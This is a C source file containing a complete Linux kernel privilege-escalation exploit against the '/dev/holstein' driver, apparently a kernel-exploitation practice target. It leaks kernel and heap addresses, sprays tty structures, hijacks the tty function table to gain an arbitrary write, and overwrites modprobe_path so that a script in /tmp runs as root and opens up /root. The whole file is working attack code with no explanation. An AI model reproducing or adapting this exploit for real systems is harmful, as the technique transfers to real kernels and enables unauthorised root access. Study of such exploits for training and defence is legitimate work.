#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define OPS_OFFSET 0xc38880
#define SPRAY_NUM 100
#define VULN_DRV "/dev/holstein"

uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
uint64_t g_buf = 0;
int global_fd = 0;
int spray[SPRAY_NUM];
char buf[0x500];
char mal_path[] = "/tmp/getshell.sh\x00";

// uint64_t stack_pivot = 0xffffffff81516264; //no SMEP
uint64_t mov_eax_rdx_ret = 0xffffffff811b7db9;
uint64_t modprobe = 0xffffffff81e38180;

void AAW32(uint64_t rdx, unsigned int rcx) {
  uint64_t *p = (uint64_t *)&buf;
  *(p + 0xc) = mov_eax_rdx_ret - base + kernel_base; // 设置触发任意写的gadget

  *(uint64_t *)&buf[0x418] = g_buf; // 劫持tty_struct的函数表为g_buf
  write(global_fd, buf, 0x420);
  for (int i = 0; i < SPRAY_NUM; i++) {
    ioctl(spray[i], rcx, rdx); // arg1:tty设备 arg2:rcx arg3：rdx
  }
}

int main() {
  for (int i = 0; i < SPRAY_NUM / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  global_fd = open("/dev/holstein", O_RDWR);
  if (global_fd == -1)
    perror("open");

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(global_fd, buf, 0x500);
  kernel_base = *(uint64_t *)&buf[0x418] - OPS_OFFSET;
  printf("[+] kernel base: 0x%lx\n", kernel_base);
  g_buf = *(uint64_t *)&buf[0x438] - 0x438;
  printf("[+] heap base: 0x%lx\n", g_buf);

  for (int i = 0; i < sizeof(mal_path); i += 4 * sizeof(char)) {
    AAW32(modprobe - base + kernel_base + i, *(uint64_t *)&mal_path[i]);
  }

  puts("[*] triggering modprobe");

  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/getshell.sh");
  system("cat /tmp/getshell.sh");
  system("chmod +x /tmp/getshell.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn"); // trigger modprobe_path

  close(global_fd);

  //   for (int i = 0; i < SPRAY_NUM; i++) {
  //     close(spray[i]);
  //   }

  return 0;
}